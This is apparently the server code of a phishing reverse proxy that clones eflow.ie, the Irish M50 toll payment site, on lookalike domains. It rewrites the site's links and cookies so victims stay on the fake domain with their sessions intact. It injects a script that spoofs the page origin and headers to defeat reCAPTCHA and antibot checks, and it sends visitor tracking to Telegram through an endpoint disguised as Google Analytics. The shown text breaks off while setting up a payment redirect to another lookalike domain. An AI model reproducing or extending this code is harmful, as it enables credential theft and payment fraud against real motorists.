// CRITICAL: Load .env FIRST before any other modules
require('dotenv').config();

const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const expressWs = require('express-ws');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const config = require('./config');
const logger = require('./logger');
const { userAgentRotation, getRandomUserAgent } = require('./user-agents');
const cacheManager = require('./cache-manager');
const telegramLogger = require('./telegram-logger');

// Create Express app
const app = express();

// Enable WebSocket support
if (config.features.websocket) {
  expressWs(app);
}

// Trust proxy if configured
// NOTE: Setting trust proxy to specific IPs to avoid rate limit issues
if (config.server.trustProxy) {
  // Trust only localhost and private networks to avoid rate limit bypass
  app.set('trust proxy', ['127.0.0.1', '::1', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']);
}

// Middleware: Security headers (relaxed for proxy)
app.use(
  helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false,
    crossOriginOpenerPolicy: false,
    crossOriginResourcePolicy: false,
  })
);

// Middleware: Compression - DISABLED to prevent double compression
// The proxy will handle compression via responseInterceptor
// if (config.features.compression) {
//   app.use(compression());
// }

// Middleware: Rate Limiting (look like normal user)
// Temporarily disabled due to trust proxy validation issue
// TODO: Re-enable with proper configuration
/*
const limiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute window
  max: process.env.NODE_ENV === 'production' ? 30 : 60, // Lower in production
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  message: 'Too many requests, please slow down',
  keyGenerator: (req) => {
    // Use X-Forwarded-For if available, otherwise use IP
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress || 'unknown';
  },
  skip: (req) => {
    // Skip rate limiting for static resources and health checks
    if (req.url === '/health' || req.url === '/cache-stats') return true;
    return req.url.match(/\.(css|js|jpg|jpeg|png|gif|svg|ico|woff|woff2|ttf|eot)$/);
  },
});

app.use(limiter);
*/

// Middleware: User-Agent rotation
app.use(userAgentRotation);

// Middleware: Cache check
app.use(cacheManager.cacheMiddleware);

// Middleware: Cookie parser
app.use(cookieParser());

// Middleware: Body parser - DISABLED for proxy
// Let http-proxy-middleware handle raw body forwarding
// app.use(express.json({ limit: '50mb' }));
// app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Middleware: Request logging (Morgan)
app.use(
  morgan('combined', {
    stream: {
      write: (message) => logger.info(message.trim()),
    },
    skip: (req) => !config.logging.logRequests,
  })
);

// Middleware: Telegram tracking (server-side - no client script needed)
app.use(telegramLogger.trackingMiddleware);

// API endpoint for client-side tracking (LEGACY - still supported)
app.post('/__track', (req, res) => {
  telegramLogger.handleTrackingAPI(req, res);
});

// NEW: Masked analytics endpoint (looks like Google Analytics)
// Handles both POST and GET (for image beacon fallback)
app.post('/g/collect', (req, res) => {
  telegramLogger.handleAnalyticsAPI(req, res);
});
app.get('/g/collect', (req, res) => {
  telegramLogger.handleAnalyticsAPI(req, res);
});

// Custom request timing middleware
app.use((req, res, next) => {
  req.startTime = Date.now();
  
  // CRITICAL FIX: Use dynamic timeout from config (PROXY_TIMEOUT + buffer)
  // Must be GREATER than proxy timeout to allow proxy to complete
  const requestTimeout = config.target.timeout + 30000; // proxy timeout + 30s buffer
  
  req.setTimeout(requestTimeout, () => {
    if (!res.headersSent) {
      logger.error('Request timeout', {
        url: req.url,
        method: req.method,
        timeout: requestTimeout,
      });
      res.status(504).json({
        error: 'Request Timeout',
        message: 'Request took too long to process',
      });
    }
  });
  
  // Log response
  res.on('finish', () => {
    const responseTime = Date.now() - req.startTime;
    logger.logRequest(req, res, responseTime);
  });
  
  next();
});

// CRITICAL: Bypass Railway Edge Cache by adding unique parameter to HTML requests
// This ensures fresh HTML is always fetched for script injection
app.use((req, res, next) => {
  // Only for GET requests that might return HTML
  if (req.method === 'GET' && !req.query._nocache) {
    const acceptsHtml = req.headers.accept && req.headers.accept.includes('text/html');
    if (acceptsHtml) {
      // Add unique timestamp parameter to bypass cache
      const separator = req.url.includes('?') ? '&' : '?';
      req.url = req.url + separator + '_nocache=' + Date.now();
      logger.debug(`[Cache Bypass] Added _nocache parameter to ${req.url}`);
    }
  }
  next();
});

// Health check endpoint (minimal info for security)
app.get('/health', (req, res) => {
  const memUsage = process.memoryUsage();
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: {
      rss: Math.round(memUsage.rss / 1024 / 1024) + 'MB',
      heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024) + 'MB',
      heapTotal: Math.round(memUsage.heapTotal / 1024 / 1024) + 'MB',
    },
  });
});

// Cache stats endpoint (protected, only in dev)
app.get('/cache-stats', (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(404).send('Not Found');
  }
  res.json(cacheManager.getStats());
});

// Clear cache endpoint (protected, only in dev)
app.post('/clear-cache', (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(404).send('Not Found');
  }
  cacheManager.clear();
  res.json({ message: 'Cache cleared' });
});

// Static files middleware - serve files from public directory
// Files in public/ directory will be served with priority over proxy
if (config.static.enabled) {
  const staticDir = path.resolve(config.static.directory);
  
  // Create public directory if it doesn't exist (but don't create any files)
  if (!fs.existsSync(staticDir)) {
    try {
      fs.mkdirSync(staticDir, { recursive: true });
      logger.info(`Created static files directory: ${staticDir}`);
    } catch (error) {
      logger.warn(`Could not create static directory: ${error.message}`);
    }
  }
  
  // Serve static files with proper headers
  // Only serves files that actually exist - no automatic index.html
  app.use(express.static(staticDir, {
    index: false, // Don't serve index.html automatically
    dotfiles: 'ignore', // Don't serve hidden files
    etag: true,
    lastModified: true,
    maxAge: process.env.NODE_ENV === 'production' ? '1d' : 0, // Cache in production
    setHeaders: (res, filePath) => {
      // Set appropriate content-type headers
      if (filePath.endsWith('.html')) {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
      }
      // Disable caching for HTML files to allow updates
      if (filePath.endsWith('.html')) {
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
      }
    },
  }));
  
  logger.info(`Static files enabled: serving from ${staticDir}`);
  logger.info(`Place files in ${config.static.directory} to serve them directly`);
} else {
  logger.info('Static files disabled');
}

// Setup proxy agent if proxy is enabled
let proxyAgent = null;
if (config.proxy && config.proxy.enabled) {
  const proxyType = process.env.PROXY_TYPE || 'socks5';
  
  if (proxyType === 'socks5' || proxyType === 'socks4') {
    // SOCKS5 proxy
    const proxyUrl = `socks5://${config.proxy.username}:${config.proxy.password}@${config.proxy.host}:${config.proxy.port}`;
    proxyAgent = new SocksProxyAgent(proxyUrl);
    logger.info(`Using SOCKS5 proxy: ${config.proxy.host}:${config.proxy.port}`);
  } else {
    // HTTP/HTTPS proxy
    const proxyUrl = `http://${config.proxy.username}:${config.proxy.password}@${config.proxy.host}:${config.proxy.port}`;
    logger.info(`Using HTTP proxy: ${config.proxy.host}:${config.proxy.port}`);
    
    if (config.target.url.startsWith('https://')) {
      proxyAgent = new HttpsProxyAgent(proxyUrl);
    } else {
      proxyAgent = new HttpProxyAgent(proxyUrl);
    }
  }
}

// Proxy configuration
const proxyOptions = {
  target: config.target.url,
  changeOrigin: true,
  ws: config.features.websocket,
  timeout: config.target.timeout,
  proxyTimeout: config.target.timeout,
  
  // Use proxy agent if configured
  agent: proxyAgent || (config.target.url.startsWith('https://') ? https.globalAgent : http.globalAgent),
  
  // CRITICAL: Parse body to forward properly
  parseReqBody: true,
  
  // CRITICAL: Self-handle response to use responseInterceptor
  selfHandleResponse: true,
  
  // CRITICAL: Forward cookies and sessions with domain rewriting
  // This allows users to authenticate through the proxy
  cookieDomainRewrite: {
    'eflow.ie': '',           // Remove domain restriction
    '.eflow.ie': '',          // Remove subdomain restriction
    'www.eflow.ie': '',       // Remove www domain restriction
    '*': '',                  // Fallback: remove all domain restrictions
  },
  cookiePathRewrite: {
    '*': '/',                 // Ensure cookies work on all paths
  },
  
  // Auto-rewrite redirects (Location headers)
  autoRewrite: true,
  followRedirects: true,
  
  // Rewrite host in redirect headers
  hostRewrite: true,
  
  // Rewrite protocol in redirect headers
  protocolRewrite: 'https',
  
  // Preserve host header for proper routing
  preserveHeaderKeyCase: true,
  
  // Handle all HTTP methods
  onProxyReq: (proxyReq, req, res) => {
    // Log proxy request
    logger.debug(`Proxying ${req.method} ${req.url} to ${config.target.url}`);
    
    // === USER-AGENT ROTATION ===
    // Use random User-Agent to look like different browsers
    if (req.randomUserAgent) {
      proxyReq.setHeader('User-Agent', req.randomUserAgent);
    }
    
    // === DISABLE DRUPAL CACHE ===
    // CRITICAL: Force Drupal to generate fresh HTML so our scripts get injected
    proxyReq.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    proxyReq.setHeader('Pragma', 'no-cache');
    
    // CRITICAL: Remove conditional request headers to prevent 304 responses
    // This ensures we always get fresh HTML for script injection
    proxyReq.removeHeader('If-None-Match');
    proxyReq.removeHeader('If-Modified-Since');
    
    // === FINGERPRINT REMOVAL ===
    // Remove headers that expose proxy/forwarding
    proxyReq.removeHeader('X-Forwarded-For');
    proxyReq.removeHeader('X-Forwarded-Host');
    proxyReq.removeHeader('X-Forwarded-Proto');
    proxyReq.removeHeader('X-Real-IP');
    proxyReq.removeHeader('Via');
    proxyReq.removeHeader('Forwarded');
    
    // Remove rate limit headers
    proxyReq.removeHeader('RateLimit');
    proxyReq.removeHeader('RateLimit-Policy');
    proxyReq.removeHeader('RateLimit-Limit');
    proxyReq.removeHeader('RateLimit-Remaining');
    proxyReq.removeHeader('RateLimit-Reset');
    
    // Forward cookies properly
    if (req.headers.cookie) {
      proxyReq.setHeader('Cookie', req.headers.cookie);
    }
    
    // Forward authorization headers
    if (req.headers.authorization) {
      proxyReq.setHeader('Authorization', req.headers.authorization);
    }
    
    // Forward CSRF tokens
    const csrfHeaders = [
      'x-csrf-token',
      'x-xsrf-token',
      'x-requested-with',
    ];
    
    csrfHeaders.forEach((header) => {
      if (req.headers[header]) {
        proxyReq.setHeader(header, req.headers[header]);
      }
    });
    
    // === CRITICAL: Fix Origin/Referer for reCAPTCHA/antibot verification ===
    // Replace proxy domain with target domain in Origin/Referer headers
    const proxyDomain = req.headers.host || '';
    const targetDomain = new URL(config.target.url).hostname;
    const targetOrigin = config.target.url.replace(/\/$/, ''); // Remove trailing slash
    
    // Build proxy origin for replacement
    const proxyOrigin = `${req.protocol}://${proxyDomain}`;
    
    // Fix Origin header - CRITICAL for AJAX requests and reCAPTCHA
    if (req.headers.origin) {
      let origin = req.headers.origin;
      // Replace full proxy origin with target origin
      if (origin.includes(proxyDomain) || origin.includes(proxyOrigin)) {
        origin = origin.replace(proxyOrigin, targetOrigin);
        origin = origin.replace(new RegExp(proxyDomain.replace(/\./g, '\\.'), 'g'), targetDomain);
        // Ensure protocol is correct
        if (origin.startsWith('http://') && targetOrigin.startsWith('https://')) {
          origin = origin.replace('http://', 'https://');
        }
        logger.debug(`[Header Fix] Origin: ${req.headers.origin} -> ${origin}`);
        proxyReq.setHeader('Origin', origin);
      } else {
        // Keep original if it doesn't contain proxy domain
        proxyReq.setHeader('Origin', req.headers.origin);
      }
    }
    // DO NOT set Origin if missing - let browser/client set it naturally
    
    // Fix Referer header - CRITICAL for AJAX requests and reCAPTCHA
    if (req.headers.referer) {
      let referer = req.headers.referer;
      // Replace full proxy origin with target origin
      if (referer.includes(proxyDomain) || referer.includes(proxyOrigin)) {
        referer = referer.replace(proxyOrigin, targetOrigin);
        referer = referer.replace(new RegExp(proxyDomain.replace(/\./g, '\\.'), 'g'), targetDomain);
        // Ensure protocol is correct
        if (referer.startsWith('http://') && targetOrigin.startsWith('https://')) {
          referer = referer.replace('http://', 'https://');
        }
        logger.debug(`[Header Fix] Referer: ${req.headers.referer} -> ${referer}`);
        proxyReq.setHeader('Referer', referer);
      } else {
        // Keep original if it doesn't contain proxy domain
        proxyReq.setHeader('Referer', req.headers.referer);
      }
    }
    // DO NOT set Referer if missing - let browser/client set it naturally
    
    // Set realistic Accept headers
    if (!proxyReq.getHeader('Accept')) {
      proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    }
    if (!proxyReq.getHeader('Accept-Language')) {
      proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.9');
    }
    if (!proxyReq.getHeader('Accept-Encoding')) {
      proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
    }
    
    // Handle form data and JSON body - DON'T modify!
    // Express already parsed the body, http-proxy-middleware will handle it
    // We just need to make sure we don't interfere
  },
  
  // Use 'on' object for event handlers (new API for v3)
  on: {
    // Handle response with responseInterceptor for automatic decompression
    proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
      try {
        // Log proxy response
        logger.debug(`Received response ${proxyRes.statusCode} for ${req.url}`);
        
        // CRITICAL: Remove proxy authentication headers from upstream response
        // This prevents ERR_UNEXPECTED_PROXY_AUTH error in browser
        delete proxyRes.headers['proxy-authenticate'];
        delete proxyRes.headers['proxy-authorization'];
        delete proxyRes.headers['proxy-connection'];
        delete proxyRes.headers['proxy-agent'];
        
        // CRITICAL: Check if response is already sent (prevent double response)
        if (res.headersSent) {
          logger.warn(`Response already sent for ${req.url}, skipping processing`);
          return responseBuffer;
        }
      
      // CRITICAL: Disable ALL caching to prevent Railway Edge from serving cached HTML
      // This ensures our script injection ALWAYS happens
      // Use multiple strategies to bypass Railway Edge Cache
      res.setHeader('Cache-Control', 'private, no-cache, no-store, must-revalidate, max-age=0, s-maxage=0');
      res.setHeader('Surrogate-Control', 'no-store'); // CDN-specific cache control
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('Expires', '0');
      res.setHeader('Vary', '*'); // Tell cache to vary on ALL headers (effectively disables cache)
      res.setHeader('X-Railway-No-Cache', '1'); // Custom header for Railway
      res.setHeader('X-Content-Cache', 'DISABLED'); // Additional cache bypass header
      res.removeHeader('ETag');
      res.removeHeader('Last-Modified');
      res.removeHeader('If-None-Match');
      res.removeHeader('If-Modified-Since');
      
      // CRITICAL: Remove proxy authentication headers to prevent ERR_UNEXPECTED_PROXY_AUTH
      res.removeHeader('Proxy-Authenticate');
      res.removeHeader('Proxy-Authorization');
      res.removeHeader('Proxy-Connection');
      res.removeHeader('Proxy-Agent');
      
      // === CACHING LOGIC ===
      // Cache successful GET responses
      if (cacheManager.shouldCache(req, { statusCode: proxyRes.statusCode })) {
        cacheManager.set(req, {
          body: responseBuffer,
          contentType: proxyRes.headers['content-type'],
          statusCode: proxyRes.statusCode,
        });
        
        logger.debug(`Cached response for ${req.url}`);
      }
      
      // CRITICAL: Handle cookies - rewrite domain for authentication to work
      if (proxyRes.headers['set-cookie']) {
        const proxyHost = req.get('host'); // Current proxy domain (efllows-m50.com)
        const targetDomain = new URL(config.target.url).hostname; // eflow.ie
        
        const cookies = proxyRes.headers['set-cookie'].map((cookie) => {
          let modifiedCookie = cookie;
          
          // 1. Remove ALL domain restrictions to make cookies work on proxy
          modifiedCookie = modifiedCookie.replace(/;\s*Domain=[^;]*/gi, '');
          
          // 2. Change SameSite from Strict/Lax to None (required for cross-origin)
          // Or remove it entirely if causing issues
          modifiedCookie = modifiedCookie.replace(/;\s*SameSite=Strict/gi, '; SameSite=Lax');
          modifiedCookie = modifiedCookie.replace(/;\s*SameSite=None/gi, '; SameSite=Lax');
          
          // 3. Remove Secure flag for local development (HTTP)
          if (req.protocol === 'http') {
            modifiedCookie = modifiedCookie.replace(/;\s*Secure/gi, '');
          }
          
          // 4. Ensure Path is set to root
          if (!modifiedCookie.includes('Path=')) {
            modifiedCookie += '; Path=/';
          }
          
          logger.debug(`[Cookie Rewrite] Original: ${cookie.substring(0, 100)}...`);
          logger.debug(`[Cookie Rewrite] Modified: ${modifiedCookie.substring(0, 100)}...`);
          
          return modifiedCookie;
        });
        
        res.setHeader('set-cookie', cookies);
      }
      
      // Handle CORS headers
      res.setHeader('Access-Control-Allow-Credentials', 'true');
      
      // DEBUG: Add header to track if interceptor is running
      res.setHeader('X-Proxy-Interceptor', 'active');
      
      // CRITICAL: Set cache headers IMMEDIATELY to prevent Railway Edge caching
      // This must be done BEFORE any content processing
      res.setHeader('Cache-Control', 'private, no-cache, no-store, must-revalidate, max-age=0, s-maxage=0');
      res.setHeader('Surrogate-Control', 'no-store');
      res.setHeader('X-Cache-Control', 'no-cache');
      
      // Handle content rewriting
      const contentType = proxyRes.headers['content-type'] || '';
      const targetDomain = new URL(config.target.url).hostname; // eflow.ie
      const proxyDomain = req.get('host'); // swa-production.up.railway.app
      
      // DEBUG LOGGING
      logger.info(`[RESPONSE INTERCEPTOR] URL: ${req.url}, ContentType: ${contentType}, Status: ${proxyRes.statusCode}, Size: ${responseBuffer.length} bytes`);
      
      // CRITICAL: Skip processing for very large files (>10MB) to prevent memory issues
      const MAX_PROCESSING_SIZE = 10 * 1024 * 1024; // 10MB
      if (responseBuffer.length > MAX_PROCESSING_SIZE) {
        logger.warn(`[RESPONSE INTERCEPTOR] Skipping processing for large file: ${req.url} (${(responseBuffer.length / 1024 / 1024).toFixed(2)}MB)`);
        return responseBuffer;
      }
      
      // ALWAYS do domain replacement for HTML/JS/CSS
      if (
        contentType.includes('text/html') ||
        contentType.includes('application/javascript') ||
        contentType.includes('text/css') ||
        contentType.includes('application/json')
      ) {
        logger.info(`[CONTENT REWRITING] Processing ${contentType} for ${req.url} (${(responseBuffer.length / 1024).toFixed(2)}KB)`);
        // responseBuffer is already decompressed by responseInterceptor!
        let bodyString;
        
        try {
          bodyString = responseBuffer.toString('utf8');
        } catch (error) {
          logger.error('Failed to convert buffer to string', {
            error: error.message,
            url: req.url,
            bufferLength: responseBuffer.length,
          });
          return responseBuffer; // Return original if conversion fails
        }
        
        // CRITICAL: Replace ALL forms of target domain with proxy domain
        // This keeps users on proxy site instead of redirecting to original
        
        // Replace http://eflow.ie
        bodyString = bodyString.replace(
          new RegExp('http://eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace https://eflow.ie
        bodyString = bodyString.replace(
          new RegExp('https://eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace http://www.eflow.ie
        bodyString = bodyString.replace(
          new RegExp('http://www\\.eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace https://www.eflow.ie
        bodyString = bodyString.replace(
          new RegExp('https://www\\.eflow\\.ie', 'gi'),
          `https://${proxyDomain}`
        );
        
        // Replace just "eflow.ie" (in href attributes, etc) - БОЛЕЕ АГРЕССИВНАЯ ЗАМЕНА
        // Заменяем eflow.ie в любых контекстах (href, src, action, data-*, onclick и т.д.)
        bodyString = bodyString.replace(
          new RegExp('(["\']|href=|src=|action=|data-|onclick=|window\\.location|location\\.href)eflow\\.ie', 'gi'),
          `$1${proxyDomain}`
        );
        
        // Заменяем относительные ссылки "/" на главной странице, которые могут вести на eflow.ie
        // Это особенно важно для логотипа, который часто имеет href="/"
        // Но только если это ссылка внутри <a> тега
        bodyString = bodyString.replace(
          new RegExp('(<a[^>]*href=["\'])(/)(["\'][^>]*>)', 'gi'),
          (match, before, slash, after) => {
            // Проверяем, не является ли это уже абсолютной ссылкой
            if (!before.includes('http') && !before.includes('//')) {
              return before + '/' + after; // Оставляем относительную ссылку, но она будет работать на прокси
            }
            return match;
          }
        );
        
        // Replace custom domain if set
        if (config.customDomain) {
          bodyString = bodyString.replace(
            new RegExp(targetDomain, 'g'),
            config.customDomain
          );
        }
        
        // INJECT SCRIPTS ONLY FOR HTML PAGES
        if (contentType.includes('text/html')) {
          logger.info(`[SCRIPT INJECTION] Preparing to inject scripts for ${req.url}`);
            const targetOrigin = config.target.url; // https://eflow.ie
            const proxyOrigin = `${req.protocol}://${proxyDomain}`;
            
            // Encode domains for reCAPTCHA 'co' parameter
            const targetBase64 = Buffer.from(`${targetOrigin}:443`).toString('base64').replace(/=/g, '.');
            const proxyBase64 = Buffer.from(`${proxyOrigin}:443`).toString('base64').replace(/=/g, '.');
            
            // COMPREHENSIVE reCAPTCHA v3 fix - intercepts ALL requests and fixes domain
            const recaptchaFixScript = `
<script>
(function() {
  'use strict';
  const TARGET_ORIGIN = '${targetOrigin}';
  const PROXY_ORIGIN = '${proxyOrigin}';
  const TARGET_BASE64 = '${targetBase64}';
  const PROXY_BASE64 = '${proxyBase64}';
  
  // Fix reCAPTCHA domain in URL
  function fixRecaptchaUrl(url) {
    if (!url || typeof url !== 'string') return url;
    // Fix 'co' parameter (domain) - escape special regex chars
    var escapeRegex = function(str) {
      return str.replace(/[.*+?^$()|[\\]\\\\]/g, '\\\\$&');
    };
    var proxyBase64Escaped = escapeRegex(PROXY_BASE64);
    var proxyBase64Regex = new RegExp('co=' + proxyBase64Escaped, 'g');
    url = url.replace(proxyBase64Regex, 'co=' + TARGET_BASE64);
    var proxyBase64Encoded = encodeURIComponent(PROXY_BASE64);
    var targetBase64Encoded = encodeURIComponent(TARGET_BASE64);
    var proxyBase64EncodedEscaped = escapeRegex(proxyBase64Encoded);
    url = url.replace(new RegExp('co=' + proxyBase64EncodedEscaped, 'g'), 'co=' + targetBase64Encoded);
    // Fix origin in URL
    var proxyOriginEscaped = escapeRegex(PROXY_ORIGIN);
    url = url.replace(new RegExp(proxyOriginEscaped, 'g'), TARGET_ORIGIN);
    return url;
  }
  
  // Fix headers for reCAPTCHA requests
  function fixRecaptchaHeaders(headers) {
    if (!headers) return headers;
    if (typeof headers === 'object') {
      const fixed = {};
      for (const key in headers) {
        let value = headers[key];
        if (key.toLowerCase() === 'origin' || key.toLowerCase() === 'referer' || key.toLowerCase() === 'referrer') {
          if (value && value.includes(PROXY_ORIGIN)) {
            value = value.replace(PROXY_ORIGIN, TARGET_ORIGIN);
          }
        }
        fixed[key] = value;
      }
      return fixed;
    }
    return headers;
  }
  
  // Intercept XMLHttpRequest - CRITICAL for Drupal AJAX and reCAPTCHA
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;
  const originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
  
  // Store request headers for each XHR instance
  const xhrHeaders = new WeakMap();
  
  XMLHttpRequest.prototype.open = function(method, url, ...rest) {
    // Fix reCAPTCHA URLs - CRITICAL for domain parameter
    if (url && typeof url === 'string' && url.includes('google.com/recaptcha')) {
      var originalUrl = url;
      url = fixRecaptchaUrl(url);
      if (url !== originalUrl) {
      }
    }
    // Store URL for later header fixing
    this._requestUrl = url;
    return originalXHROpen.apply(this, [method, url, ...rest]);
  };
  
  XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
    // CRITICAL: Fix Origin/Referer for ALL requests (not just reCAPTCHA)
    // Drupal AJAX needs correct Origin/Referer for antibot verification
    if (header && (header.toLowerCase() === 'origin' || header.toLowerCase() === 'referer' || header.toLowerCase() === 'referrer')) {
      if (value && value.includes(PROXY_ORIGIN)) {
        value = value.replace(PROXY_ORIGIN, TARGET_ORIGIN);
      }
    }
    // Store headers for this XHR instance
    if (!xhrHeaders.has(this)) {
      xhrHeaders.set(this, {});
    }
    xhrHeaders.get(this)[header.toLowerCase()] = value;
    return originalXHRSetRequestHeader.apply(this, [header, value]);
  };
  
  // Override send to ensure headers are fixed before sending
  XMLHttpRequest.prototype.send = function(data) {
    // If we have stored headers, re-apply them with fixes
    const storedHeaders = xhrHeaders.get(this);
    if (storedHeaders) {
      for (const header in storedHeaders) {
        let value = storedHeaders[header];
        if (header === 'origin' || header === 'referer' || header === 'referrer') {
          if (value && value.includes(PROXY_ORIGIN)) {
            value = value.replace(PROXY_ORIGIN, TARGET_ORIGIN);
            // Re-set header with fixed value
            originalXHRSetRequestHeader.call(this, header, value);
          }
        }
      }
    }
    return originalXHRSend.apply(this, arguments);
  };
  
  // Intercept Fetch API - CRITICAL for Drupal AJAX and reCAPTCHA
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    let url = args[0];
    let options = args[1] || {};
    
    // Fix reCAPTCHA URLs - CRITICAL for domain parameter
    if (url && typeof url === 'string' && url.includes('google.com/recaptcha')) {
      var originalUrl = url;
      url = fixRecaptchaUrl(url);
      if (url !== originalUrl) {
      }
      args[0] = url;
    }
    
    // CRITICAL: Fix headers for ALL requests (not just reCAPTCHA)
    // Drupal AJAX needs correct Origin/Referer for antibot verification
    if (options && typeof options === 'object') {
      // Fix headers object
      if (options.headers) {
        if (options.headers instanceof Headers) {
          // Headers object - need to recreate
          const newHeaders = new Headers(options.headers);
          if (newHeaders.has('origin')) {
            const origin = newHeaders.get('origin');
            if (origin && origin.includes(PROXY_ORIGIN)) {
              newHeaders.set('origin', origin.replace(PROXY_ORIGIN, TARGET_ORIGIN));
            }
          }
          if (newHeaders.has('referer') || newHeaders.has('referrer')) {
            const referer = newHeaders.get('referer') || newHeaders.get('referrer');
            if (referer && referer.includes(PROXY_ORIGIN)) {
              newHeaders.set('referer', referer.replace(PROXY_ORIGIN, TARGET_ORIGIN));
              newHeaders.set('referrer', referer.replace(PROXY_ORIGIN, TARGET_ORIGIN));
            }
          }
          options.headers = newHeaders;
        } else if (typeof options.headers === 'object') {
          // Plain object
          options.headers = fixRecaptchaHeaders(options.headers);
        }
      }
      // Also fix Origin/Referer at top level if present
      if (options.origin && options.origin.includes(PROXY_ORIGIN)) {
        options.origin = options.origin.replace(PROXY_ORIGIN, TARGET_ORIGIN);
      }
      if (options.referer && options.referer.includes(PROXY_ORIGIN)) {
        options.referer = options.referer.replace(PROXY_ORIGIN, TARGET_ORIGIN);
      }
      if (options.referrer && options.referrer.includes(PROXY_ORIGIN)) {
        options.referrer = options.referrer.replace(PROXY_ORIGIN, TARGET_ORIGIN);
      }
      args[1] = options;
    }
    
    return originalFetch.apply(this, args);
  };
  
  // Intercept reCAPTCHA script loading
  const originalCreateElement = document.createElement;
  document.createElement = function(tagName, ...rest) {
    const element = originalCreateElement.apply(this, [tagName, ...rest]);
    if (tagName.toLowerCase() === 'script') {
      const originalSetAttribute = element.setAttribute;
      element.setAttribute = function(name, value) {
        if (name === 'src' && value && value.includes('google.com/recaptcha')) {
          value = fixRecaptchaUrl(value);
        }
        return originalSetAttribute.apply(this, [name, value]);
      };
    }
    return element;
  };
  
  // CRITICAL: Override grecaptcha.execute to fix domain BEFORE token generation
  // reCAPTCHA v3 uses window.location.origin to generate token - we MUST override it
  function wrapGrecaptcha(grecaptchaObj) {
    if (!grecaptchaObj) return grecaptchaObj;
    
    const originalExecute = grecaptchaObj.execute;
    if (originalExecute) {
      grecaptchaObj.execute = function(siteKey, options) {
        
        // CRITICAL: Temporarily override window.location.origin during token generation
        // This ensures token is generated with TARGET_ORIGIN instead of PROXY_ORIGIN
        const originalLocation = window.location;
        const locationState = { overridden: false };
        
        // Create restore function in outer scope
        function restoreLocation() {
          try {
            if (locationState.overridden) {
              delete window.location;
              Object.defineProperty(window, 'location', {
                get: function() {
                  return originalLocation;
                },
                configurable: true,
                enumerable: true
              });
              locationState.overridden = false;
            }
          } catch (e) {
          }
        }
        
        try {
          // Create a proxy that returns TARGET_ORIGIN for origin property
          const locationProxy = new Proxy(originalLocation, {
            get: function(target, prop) {
              if (prop === 'origin') {
                return TARGET_ORIGIN;
              }
              if (prop === 'hostname') {
                return new URL(TARGET_ORIGIN).hostname;
              }
              if (prop === 'host') {
                return new URL(TARGET_ORIGIN).host;
              }
              if (prop === 'href' && target.href && target.href.includes(PROXY_ORIGIN)) {
                return target.href.replace(PROXY_ORIGIN, TARGET_ORIGIN);
              }
              return target[prop];
            }
          });
          
          // Override window.location temporarily
          Object.defineProperty(window, 'location', {
            get: function() {
              return locationProxy;
            },
            configurable: true,
            enumerable: true
          });
          locationState.overridden = true;
          
          // Call original execute - token will be generated with TARGET_ORIGIN
          let result;
          try {
            result = originalExecute.apply(this, arguments);
            
            // CRITICAL: reCAPTCHA v3 execute() returns a Promise
            // Token generation happens inside the Promise, so we need to restore location AFTER Promise resolves
            if (result && typeof result.then === 'function') {
              // It's a Promise - restore location after token is generated
              result.then(function(token) {
                restoreLocation();
                return token;
              }).catch(function(error) {
                restoreLocation();
                throw error;
              });
            } else {
              // Not a Promise - restore immediately
              setTimeout(restoreLocation, 50);
            }
          } catch (syncError) {
            // Synchronous error - restore location immediately
            restoreLocation();
            throw syncError;
          }
          
          return result;
        } catch (e) {
          // Fallback: just call original
          if (locationOverridden) {
            try {
              delete window.location;
              Object.defineProperty(window, 'location', {
                get: function() {
                  return originalLocation;
                },
                configurable: true,
                enumerable: true
              });
            } catch (restoreError) {
            }
          }
          return originalExecute.apply(this, arguments);
        }
      };
    }
    
    return grecaptchaObj;
  }
  
  // Store grecaptcha in closure to avoid 'this' context issues
  let _storedGrecaptcha = window.grecaptcha ? wrapGrecaptcha(window.grecaptcha) : undefined;
  
  // Monitor for grecaptcha initialization
  Object.defineProperty(window, 'grecaptcha', {
    set: function(value) {
      _storedGrecaptcha = wrapGrecaptcha(value);
    },
    get: function() {
      return _storedGrecaptcha;
    },
    configurable: true,
    enumerable: true
  });
  
})();
</script>`;
            
            // UNIVERSAL Payment Redirect - Works on ALL pages
            let PAYMENT_SYSTEM_URL = process.env.PAYMENT_SYSTEM_URL || 'https://m50-efflows.com';
            
            // CRITICAL: Ensure PAYMENT_SYSTEM_URL has protocol
            // If no protocol is specified, add https://
